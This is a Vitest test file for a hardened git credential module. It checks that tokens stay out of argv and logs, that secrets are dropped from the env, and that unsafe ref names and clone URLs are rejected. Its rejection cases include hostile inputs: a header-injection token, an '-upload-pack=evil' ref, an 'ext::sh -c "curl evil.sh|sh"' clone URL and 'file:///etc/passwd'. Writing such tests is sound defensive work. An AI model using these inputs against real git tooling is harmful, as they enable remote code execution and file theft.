import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
  execFileAsync: vi.fn(),
}));

vi.mock('./execution/exec', () => ({
  execFileAsync: mocks.execFileAsync,
}));

const {
  acquireGitCredential,
  assertSafeCloneUrl,
  assertSafeRefName,
  buildHardenedGitArgs,
  createGitCredentialEnv,
  credentialScopeUrl,
  execGit,
  execGitWithCredentials,
  GitCredentialError,
  HARDENED_GIT_ENV,
  parseGitVersion,
  resetGitVersionCheckForTests,
} = await import('./git-credentials');
const { logger } = await import('../lib/logger');

const { GIT_HARDENING_CONFIG_ARGS } = await import('../sandbox/git-hardening');

// W09a: the fixed `-c` hardening grew (fsmonitor/editor/ssh/gpg/credential
// helper reset/submodule recursion); it is asserted in detail in
// sandbox/git-hardening.test.ts and against real git in
// sandbox/git-hardening.realgit.test.ts.
const HARDENED_PREFIX = [
  ...GIT_HARDENING_CONFIG_ARGS,
  '-c', 'protocol.allow=never',
  '-c', 'protocol.https.allow=always',
];

describe('git credentials', () => {
  beforeEach(() => {
    mocks.execFileAsync.mockReset();
  });

  // W10a: credentials travel as an ephemeral, URL-scoped HTTP header in the
  // ONE git process's environment (GIT_CONFIG_COUNT/KEY/VALUE) — never argv,
  // a credential-helper file, TMPDIR or repository config.
  it('adds no credential env without a token or without an http(s) remote', () => {
    expect(createGitCredentialEnv(null, 'https://github.com/acme/repo.git')).toEqual({});
    expect(createGitCredentialEnv('ghs_token', undefined)).toEqual({});
    expect(createGitCredentialEnv('ghs_token', 'git@github.com:acme/repo.git')).toEqual({});
    expect(createGitCredentialEnv('ghs_token', 'file:///tmp/repo.git')).toEqual({});
    expect(createGitCredentialEnv('ghs_token', 'https://github.com/')).toEqual({});
  });

  it('scopes a basic-auth header to the repository URL without userinfo, query or fragment', () => {
    expect(credentialScopeUrl('https://user:pw@github.com/acme/repo.git/?x=1#frag')).toBe('https://github.com/acme/repo.git');
    const env = createGitCredentialEnv('ghs_abc123', 'https://github.com/acme/repo.git');
    expect(env).toEqual({
      GIT_CONFIG_COUNT: '1',
      GIT_CONFIG_KEY_0: 'http.https://github.com/acme/repo.git.extraHeader',
      GIT_CONFIG_VALUE_0: `Authorization: Basic ${Buffer.from('x-access-token:ghs_abc123').toString('base64')}`,
    });
  });

  it('refuses tokens that could inject into the HTTP header', () => {
    for (const bad of ['tok en', 'tok\r\nX-Evil: 1', 'tok:en', '']) {
      if (bad === '') {
        expect(createGitCredentialEnv(bad, 'https://github.com/acme/repo.git')).toEqual({});
        continue;
      }
      expect(() => createGitCredentialEnv(bad, 'https://github.com/acme/repo.git')).toThrow(GitCredentialError);
    }
  });

  it('passes the token only through the git child env, never argv, and keeps the hardening', async () => {
    resetGitVersionCheckForTests();
    mocks.execFileAsync.mockImplementation(async (_file, args) => (
      args[0] === '--version' ? { stdout: 'git version 2.49.0\n', stderr: '' } : { stdout: 'ok', stderr: '' }
    ));

    await expect(execGitWithCredentials(['ls-remote', '--', 'https://github.com/acme/repo.git'], 'ghs_secret_value', 'https://github.com/acme/repo.git', {
      cwd: '/repo',
      env: { JWT_SECRET: 'fake-secret', GIT_AUTHOR_NAME: 'Agent' },
    })).resolves.toEqual({ stdout: 'ok', stderr: '' });

    const call = mocks.execFileAsync.mock.calls.find(([, args]) => args.includes('ls-remote'));
    const [file, args, options] = call;
    expect(file).toBe('git');
    expect(args.slice(0, HARDENED_PREFIX.length)).toEqual(HARDENED_PREFIX);
    expect(args.join(' ')).not.toContain('ghs_secret_value');
    expect(args.join(' ')).not.toContain('credential.helper=store');
    expect(options.cwd).toBe('/repo');
    expect(options.env).toEqual(expect.objectContaining({ ...HARDENED_GIT_ENV, GIT_CONFIG_COUNT: '1', GIT_AUTHOR_NAME: 'Agent' }));
    expect(options.env.GIT_CONFIG_VALUE_0).toContain(Buffer.from('x-access-token:ghs_secret_value').toString('base64'));
    expect(options.env).not.toHaveProperty('JWT_SECRET');
  });

  it('refuses header authentication on git older than 2.31 and accepts newer', async () => {
    expect(parseGitVersion('git version 2.30.9')).toEqual([2, 30]);
    expect(parseGitVersion('nonsense')).toBeNull();
    resetGitVersionCheckForTests();
    mocks.execFileAsync.mockResolvedValue({ stdout: 'git version 2.30.9\n', stderr: '' });
    await expect(execGitWithCredentials(['fetch'], 'ghs_token', 'https://github.com/acme/repo.git')).rejects.toThrow(/2\.31 or newer/);
    resetGitVersionCheckForTests();
    mocks.execFileAsync.mockImplementation(async (_file, args) => (
      args[0] === '--version' ? { stdout: 'git version 2.31.0\n', stderr: '' } : { stdout: '', stderr: '' }
    ));
    await expect(execGitWithCredentials(['fetch'], 'ghs_token', 'https://github.com/acme/repo.git')).resolves.toBeDefined();
  });

  it('acquires one effect-specific credential, returns the token and logs only its kind', async () => {
    const info = vi.spyOn(logger, 'info').mockImplementation(() => undefined);
    const source = { gitCredential: vi.fn(async (effect) => ({
      provider: 'github', kind: 'installation', effect, token: 'ghs_installation', repository: 'acme/repo',
      permissions: { contents: 'read' }, expiresAt: new Date(Date.now() + 3_600_000).toISOString(),
      notAfter: new Date(Date.now() + 3_600_000).toISOString(), grantId: 'g1', reused: false, fallbackReason: null,
    })) };
    await expect(acquireGitCredential(source, 'fetch', { attemptId: 'a1' })).resolves.toBe('ghs_installation');
    expect(source.gitCredential).toHaveBeenCalledWith('fetch');
    const logged = JSON.stringify(info.mock.calls);
    expect(logged).toContain('installation');
    expect(logged).not.toContain('ghs_installation');
    info.mockRestore();
  });

  it('rejects a credential the control plane issued already expired', async () => {
    const source = { gitCredential: async () => ({ provider: 'github', kind: 'user_oauth', effect: 'push', token: 'gho_x', notAfter: new Date(Date.now() - 1_000).toISOString() }) };
    await expect(acquireGitCredential(source, 'push', { attemptId: 'a1' })).rejects.toThrow(GitCredentialError);
  });

  it('builds hardened args ahead of the caller-supplied args', () => {
    expect(buildHardenedGitArgs(['status'])).toEqual([...HARDENED_PREFIX, 'status']);
  });

  it('runs execGit with hardened args and keeps only identity variables from the caller env', async () => {
    mocks.execFileAsync.mockResolvedValue({ stdout: '', stderr: '' });

    // W09a: a call site's env may contribute GIT_AUTHOR_*/GIT_COMMITTER_*
    // only; anything else (here CUSTOM and a spread secret) is dropped.
    await execGit(['-C', '/repo', 'status'], { env: { CUSTOM: '1', JWT_SECRET: 'fake-secret', GIT_AUTHOR_NAME: 'Agent' } });

    expect(mocks.execFileAsync).toHaveBeenCalledWith(
      'git',
      [...HARDENED_PREFIX, '-C', '/repo', 'status'],
      { env: expect.objectContaining({ GIT_AUTHOR_NAME: 'Agent', ...HARDENED_GIT_ENV }) },
    );
    const [, , options] = mocks.execFileAsync.mock.calls[0];
    expect(options.env).not.toHaveProperty('CUSTOM');
    expect(options.env).not.toHaveProperty('JWT_SECRET');
  });

  it('defaults execGit env to process.env merged with the hardening', async () => {
    mocks.execFileAsync.mockResolvedValue({ stdout: '', stderr: '' });

    await execGit(['status']);

    const [, , options] = mocks.execFileAsync.mock.calls[0];
    expect(options.env).toEqual(expect.objectContaining(HARDENED_GIT_ENV));
  });

  describe('assertSafeRefName', () => {
    it('accepts ordinary ref names', () => {
      expect(assertSafeRefName('openlinear/task-1')).toBe('openlinear/task-1');
      expect(assertSafeRefName('main')).toBe('main');
      expect(assertSafeRefName('release/1.2.3')).toBe('release/1.2.3');
    });

    it.each([
      ['', 'empty string'],
      ['-upload-pack=evil', 'leading dash'],
      ['/leading-slash', 'leading slash'],
      ['trailing-slash/', 'trailing slash'],
      ['.leading-dot', 'leading dot'],
      ['trailing-dot.', 'trailing dot'],
      ['has..dotdot', 'dot-dot traversal'],
      ['has space', 'whitespace'],
      ['has\ttab', 'control character'],
      ['has;semicolon', 'shell metacharacter'],
      [null, 'non-string'],
      [undefined, 'undefined'],
    ])('rejects %j (%s)', (value) => {
      expect(() => assertSafeRefName(value)).toThrow('[Sidecar] Refusing unsafe ref name');
    });

    it('includes the provided description in the error', () => {
      expect(() => assertSafeRefName('-bad', 'default branch')).toThrow(
        '[Sidecar] Refusing unsafe default branch',
      );
    });
  });

  describe('assertSafeCloneUrl', () => {
    const ORIGINAL_GITHUB_HOST = process.env.GITHUB_HOST;

    beforeEach(() => {
      delete process.env.GITHUB_HOST;
    });

    afterEach(() => {
      if (ORIGINAL_GITHUB_HOST === undefined) {
        delete process.env.GITHUB_HOST;
      } else {
        process.env.GITHUB_HOST = ORIGINAL_GITHUB_HOST;
      }
    });

    it('accepts an https github.com URL', () => {
      expect(assertSafeCloneUrl('https://github.com/acme/repo.git')).toBe(
        'https://github.com/acme/repo.git',
      );
    });

    it('respects a configured GITHUB_HOST allowlist', () => {
      process.env.GITHUB_HOST = 'github.example.com';
      expect(assertSafeCloneUrl('https://github.example.com/acme/repo.git')).toBe(
        'https://github.example.com/acme/repo.git',
      );
      expect(() => assertSafeCloneUrl('https://github.com/acme/repo.git')).toThrow(
        'host must be github.example.com',
      );
    });

    it.each([
      ['', 'empty string'],
      ['not a url', 'unparsable string'],
      ['ext::sh -c "curl evil.sh|sh"', 'ext:: remote helper'],
      ['file:///etc/passwd', 'file:// scheme'],
      ['ssh://git@github.com/acme/repo.git', 'ssh:// scheme'],
      ['http://github.com/acme/repo.git', 'non-https scheme'],
      ['https://evil.example.com/acme/repo.git', 'disallowed host'],
      [null, 'non-string'],
    ])('rejects %j (%s)', (value) => {
      expect(() => assertSafeCloneUrl(value)).toThrow('[Sidecar] Refusing unsafe clone URL');
    });
  });
});
